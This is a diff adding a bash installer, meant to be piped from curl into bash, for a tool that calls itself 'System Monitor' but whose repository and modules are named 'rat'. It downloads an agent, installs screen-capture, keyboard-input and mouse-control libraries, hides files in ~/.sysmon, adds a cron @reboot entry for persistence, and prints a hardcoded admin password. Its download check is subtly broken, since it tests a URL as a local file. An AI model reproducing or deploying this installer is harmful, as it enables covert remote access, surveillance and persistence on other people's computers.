@@ -1,0 +1,260 @@
+#!/bin/bash
+
+################################################################################
+# System Monitor - Bootstrap Installer
+# 
+# Usage: curl -sSL https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
+#        OR: wget -qO- https://raw.githubusercontent.com/YOUR_USER/rat/main/install | bash
+#
+# This script downloads and installs the System Monitor automatically
+################################################################################
+
+set -e
+
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+print_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
+print_success() { echo -e "${GREEN}[OK]${NC} $1"; }
+print_warning() { echo -e "${YELLOW}[WARN]${NC} $1"; }
+print_error() { echo -e "${RED}[FAIL]${NC} $1"; }
+
+# Configuration - UPDATE THESE URLs
+GITHUB_USER="dukeetheprogrammer"
+GITHUB_REPO="rat"
+GITHUB_BRANCH="main"
+BASE_URL="https://raw.githubusercontent.com/${GITHUB_USER}/${GITHUB_REPO}/${GITHUB_BRANCH}"
+
+# Download URL for the full agent
+AGENT_URL="${BASE_URL}/agent.tar.gz"
+
+echo ""
+echo "================================================================"
+echo "              System Monitor - Bootstrap Installer"
+echo "================================================================"
+echo ""
+
+# Detect OS
+print_info "Detecting operating system..."
+
+if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
+    OS="windows"
+    echo "Detected: Windows (MSYS/MinGW)"
+elif [[ "$OSTYPE" == "darwin"* ]]; then
+    OS="macos"
+    echo "Detected: macOS"
+elif [[ -f /etc/debian_version ]]; then
+    OS="debian"
+    echo "Detected: Debian/Ubuntu"
+elif [[ -f /etc/redhat-release ]]; then
+    OS="redhat"
+    echo "Detected: RHEL/Fedora"
+elif [[ -f /etc/arch-release ]]; then
+    OS="arch"
+    echo "Detected: Arch Linux"
+else
+    OS="linux"
+    echo "Detected: Linux (generic)"
+fi
+
+# Check Python
+print_info "Checking Python..."
+
+if command -v python3 &> /dev/null; then
+    PYTHON_CMD="python3"
+elif command -v python &> /dev/null; then
+    PYTHON_CMD="python"
+else
+    print_error "Python not found!"
+    echo "Please install Python 3.8+ first:"
+    echo "  Ubuntu/Debian: sudo apt install python3 python3-pip"
+    echo "  RHEL/Fedora:   sudo dnf install python3 python3-pip"
+    echo "  macOS:         brew install python3"
+    echo "  Windows:       https://python.org"
+    exit 1
+fi
+
+print_success "Python: $($PYTHON_CMD --version)"
+
+# Check pip
+if ! $PYTHON_CMD -m pip --version &> /dev/null; then
+    print_info "Installing pip..."
+    if command -v apt-get &> /dev/null; then
+        sudo apt-get install -y python3-pip
+    elif command -v dnf &> /dev/null; then
+        sudo dnf install -y python3-pip
+    else
+        curl -sS https://bootstrap.pypa.io/get-pip.py | $PYTHON_CMD
+    fi
+fi
+
+print_success "pip: $($PYTHON_CMD -m pip --version | cut -d' ' -f1-2)"
+
+# Download agent
+print_info "Downloading System Monitor agent..."
+
+INSTALL_DIR="$HOME/.sysmon"
+AGENT_DIR="$INSTALL_DIR/agent"
+
+mkdir -p "$INSTALL_DIR"
+
+if [ -f "$AGENT_URL" ]; then
+    # Download the agent tarball
+    if command -v wget &> /dev/null; then
+        wget -q --show-progress "$AGENT_URL" -O "$INSTALL_DIR/agent.tar.gz"
+    elif command -v curl &> /dev/null; then
+        curl -sL "$AGENT_URL" -o "$INSTALL_DIR/agent.tar.gz"
+    else
+        print_error "Neither wget nor curl found!"
+        exit 1
+    fi
+    
+    # Extract
+    print_info "Extracting agent..."
+    tar -xzf "$INSTALL_DIR/agent.tar.gz" -C "$INSTALL_DIR/"
+    
+    # Clean up
+    rm -f "$INSTALL_DIR/agent.tar.gz"
+    
+    print_success "Agent downloaded and extracted"
+else
+    print_warning "Could not download from $AGENT_URL"
+    print_info "Checking for local rat folder..."
+    
+    if [ -d "rat" ]; then
+        print_success "Found local rat folder, using that instead"
+        cp -r rat "$AGENT_DIR"
+    else
+        print_error "No local rat folder and could not download!"
+        exit 1
+    fi
+fi
+
+# Install Python dependencies
+print_info "Installing Python dependencies..."
+
+$PYTHON_CMD -m pip install --quiet --upgrade pip
+
+# Install packages
+$PYTHON_CMD -m pip install --quiet \
+    flask flask-socketio requests mss pillow \
+    python-socketio python-engineio pyautogui 2>/dev/null || true
+
+# Linux-specific
+if [[ "$OS" == "debian" || "$OS" == "redhat" || "$OS" == "arch" ]]; then
+    $PYTHON_CMD -m pip install --quiet evdev 2>/dev/null || true
+fi
+
+print_success "Python dependencies installed"
+
+# Install system tools (Linux only)
+if [[ "$OS" == "debian" || "$OS" == "redhat" || "$OS" == "arch" ]]; then
+    print_info "Installing system tools..."
+    
+    if ! command -v xdotool &> /dev/null; then
+        if [[ "$OS" == "debian" ]]; then
+            sudo apt-get update -qq && sudo apt-get install -y -qq xdotool imagemagick 2>/dev/null || true
+        elif [[ "$OS" == "redhat" ]]; then
+            sudo dnf install -y -q xdotool ImageMagick 2>/dev/null || true
+        elif [[ "$OS" == "arch" ]]; then
+            sudo pacman -S --noconfirm -q xdotool imagemagick 2>/dev/null || true
+        fi
+    fi
+    
+    if command -v xdotool &> /dev/null; then
+        print_success "xdotool installed"
+    else
+        print_warning "xdotool not installed (mouse control limited)"
+    fi
+fi
+
+# Initialize database
+print_info "Initializing database..."
+
+cd "$AGENT_DIR"
+$PYTHON_CMD -c "
+import sys
+sys.path.insert(0, '.')
+from rat_agent.database import init_db
+init_db()
+" 2>/dev/null || print_warning "Database may already exist"
+
+print_success "Database ready"
+
+# Setup auto-start
+print_info "Configuring auto-start..."
+
+if [[ "$OS" == "debian" || "$OS" == "redhat" || "$OS" == "arch" ]]; then
+    # Linux: Use cron
+    CRON_LINE="@reboot cd $AGENT_DIR && nohup $PYTHON_CMD rat_agent/agent.py >> /tmp/sysmon_agent.log 2>&1 & sleep 5 && nohup $PYTHON_CMD dashboard/app.py >> /tmp/sysmon_dashboard.log 2>&1 &"
+    
+    # Remove old entries
+    (crontab -l 2>/dev/null | grep -v "sysmon") | crontab - 2>/dev/null || true
+    
+    # Add new entry
+    (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab -
+    
+    print_success "Auto-start configured via cron"
+elif [[ "$OS" == "macos" ]]; then
+    # macOS: Use launch agent
+    print_warning "Auto-start not configured for macOS (manual setup required)"
+else
+    print_warning "Auto-start not configured for this OS"
+fi
+
+# Start services
+print_info "Starting System Monitor..."
+
+cd "$AGENT_DIR"
+
+# Kill existing processes
+pkill -f "rat_agent/agent.py" 2>/dev/null || true
+pkill -f "dashboard/app.py" 2>/dev/null || true
+sleep 2
+
+# Start agent
+nohup $PYTHON_CMD "$AGENT_DIR/rat_agent/agent.py" > /tmp/sysmon_agent.log 2>&1 &
+AGENT_PID=$!
+print_success "Agent started (PID: $AGENT_PID)"
+
+# Start dashboard
+nohup $PYTHON_CMD "$AGENT_DIR/dashboard/app.py" > /tmp/sysmon_dashboard.log 2>&1 &
+DASHBOARD_PID=$!
+print_success "Dashboard started (PID: $DASHBOARD_PID)"
+
+# Wait for dashboard
+sleep 5
+
+# Check if running
+if curl -s -o /dev/null http://127.0.0.1:5000/login; then
+    print_success "Dashboard is running!"
+else
+    print_warning "Dashboard may still be starting..."
+fi
+
+# Done
+echo ""
+echo "================================================================"
+echo "                    Installation Complete"
+echo "================================================================"
+echo ""
+echo "  Local URL:   http://localhost:5000"
+echo "  Login:       admin / rat_admin_2024"
+echo ""
+echo "  Agent PID:      $AGENT_PID"
+echo "  Dashboard PID:  $DASHBOARD_PID"
+echo ""
+echo "  Logs:"
+echo "    Agent:     tail -f /tmp/sysmon_agent.log"
+echo "    Dashboard: tail -f /tmp/sysmon_dashboard.log"
+echo ""
+echo "  Stop:   pkill -f 'rat_agent/agent.py'; pkill -f 'dashboard/app.py'"
+echo "  Status: ps aux | grep sysmon"
+echo ""
+echo "  Agent location: $AGENT_DIR"
+echo ""
+echo "================================================================"
